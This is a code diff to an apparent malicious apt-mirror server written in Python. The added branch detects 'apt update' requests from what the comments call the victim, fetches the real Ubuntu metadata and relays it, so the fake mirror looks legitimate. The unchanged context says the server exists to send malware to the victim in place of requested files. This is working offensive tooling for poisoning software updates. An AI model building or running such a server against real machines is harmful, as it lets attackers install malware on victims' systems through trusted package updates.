@@ -85,6 +85,21 @@ class Server(BaseHTTPRequestHandler):
             # remove the corrupted deb file
             # print("remove deb file\n")
             # os.system("rm ./{}".format(package_filename))
+        elif "ubuntu/dists" in self.path:
+            # if ubuntu/dists is in the request, the victim is using apt update
+            print("apt update")
+
+            # get requested update
+            r = requests.get(base_url + self.path)
+
+            # create response with status 200 and the same headers as r
+            self.send_response(200)
+            for header in r.headers.keys():
+                self.send_header(header, r.headers[header])
+            self.end_headers()
+
+            # forward to victim
+            self.wfile.write(r.content)
         else:
             # if the request is not for an ubuntu package we try to send the requested file
             # this is so we can send the malware to the victim
